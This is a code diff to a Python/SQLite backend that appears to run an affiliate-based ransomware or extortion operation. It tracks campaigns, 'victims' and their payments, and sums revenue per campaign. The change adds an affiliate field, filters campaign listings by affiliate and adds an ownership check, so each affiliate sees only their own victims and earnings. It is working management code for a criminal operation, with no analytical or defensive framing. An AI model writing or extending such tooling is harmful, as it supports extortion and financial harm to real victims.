@@ -420,7 +420,7 @@ def init_db() -> None:
         conn.execute("""CREATE TABLE IF NOT EXISTS campaigns (
             id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT UNIQUE NOT NULL,
             note TEXT DEFAULT '', active INTEGER DEFAULT 1, created TEXT,
-            config TEXT DEFAULT '{}')""")
+            config TEXT DEFAULT '{}', affiliate TEXT DEFAULT '')""")
         conn.execute("""CREATE TABLE IF NOT EXISTS artifacts (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
             campaign_id INTEGER DEFAULT 0, kind TEXT DEFAULT '',
@@ -520,6 +520,9 @@ def init_db() -> None:
         pay_cols = _columns(conn, "payments")
         if "affiliate" not in pay_cols:
             conn.execute("ALTER TABLE payments ADD COLUMN affiliate TEXT DEFAULT ''")
+        camp_cols = _columns(conn, "campaigns")
+        if "affiliate" not in camp_cols:
+            conn.execute("ALTER TABLE campaigns ADD COLUMN affiliate TEXT DEFAULT ''")
 
         conn.execute("INSERT OR IGNORE INTO schema_migrations (version, applied) "
                      "VALUES (?, ?)", ("v3", now()))
@@ -1441,11 +1444,13 @@ def affiliate_summary(username: str) -> dict:
             "victims": int(victims)}
 
 
-def create_campaign(name: str, note: str = "", config: str = "{}") -> int:
+def create_campaign(name: str, note: str = "", config: str = "{}",
+                    affiliate: str = "") -> int:
     with db() as conn:
-        cur = conn.execute("INSERT INTO campaigns (name, note, active, created, config) "
-                           "VALUES (?,?,?,?,?)",
-                           (name.strip()[:120], note[:1000], 1, now(), config[:20000]))
+        cur = conn.execute("INSERT INTO campaigns (name, note, active, created, "
+                           "config, affiliate) VALUES (?,?,?,?,?,?)",
+                           (name.strip()[:120], note[:1000], 1, now(),
+                            config[:20000], (affiliate or "").strip()[:80]))
         conn.commit()
         return _insert_id(conn, cur)
 
@@ -1467,13 +1472,18 @@ def campaign_by_token(token: str) -> int:
     return 0
 
 
-def list_campaigns() -> list:
+def list_campaigns(affiliate: str = "") -> list:
     with db() as conn:
-        rows = conn.execute(
-            "SELECT c.*, (SELECT COUNT(*) FROM victims v WHERE v.campaign_id=c.id) "
-            "AS victims, (SELECT COALESCE(SUM(p.amount),0) FROM payments p "
-            "JOIN victims v2 ON v2.vid=p.vid WHERE v2.campaign_id=c.id) AS revenue "
-            "FROM campaigns c ORDER BY c.id DESC").fetchall()
+        sql = ("SELECT c.*, (SELECT COUNT(*) FROM victims v WHERE v.campaign_id=c.id) "
+               "AS victims, (SELECT COALESCE(SUM(p.amount),0) FROM payments p "
+               "JOIN victims v2 ON v2.vid=p.vid WHERE v2.campaign_id=c.id) AS revenue "
+               "FROM campaigns c")
+        params = ()
+        if affiliate:
+            sql += " WHERE c.affiliate=?"
+            params = ((affiliate or "").strip()[:80],)
+        sql += " ORDER BY c.id DESC"
+        rows = conn.execute(sql, params).fetchall()
     return rows
 
 
@@ -1482,11 +1492,28 @@ def get_campaign(cid: int):
         return conn.execute("SELECT * FROM campaigns WHERE id=?", (int(cid),)).fetchone()
 
 
-def update_campaign(cid: int, note: str, active: int, config: str) -> None:
+def update_campaign(cid: int, note: str, active: int, config: str,
+                    affiliate: str = None) -> None:
     with db() as conn:
-        conn.execute("UPDATE campaigns SET note=?, active=?, config=? WHERE id=?",
-                     (note[:1000], 1 if active else 0, config[:20000], int(cid)))
+        if affiliate is None:
+            conn.execute("UPDATE campaigns SET note=?, active=?, config=? WHERE id=?",
+                         (note[:1000], 1 if active else 0, config[:20000],
+                          int(cid)))
+        else:
+            conn.execute("UPDATE campaigns SET note=?, active=?, config=?, "
+                         "affiliate=? WHERE id=?",
+                         (note[:1000], 1 if active else 0, config[:20000],
+                          (affiliate or "").strip()[:80], int(cid)))
         conn.commit()
+
+
+def campaign_owned(cid: int, username: str) -> bool:
+    if not username:
+        return False
+    with db() as conn:
+        return conn.execute(
+            "SELECT 1 FROM campaigns WHERE id=? AND affiliate=?",
+            (int(cid), username)).fetchone() is not None
 
 
 def assign_campaign(vid: str, cid: int) -> None:
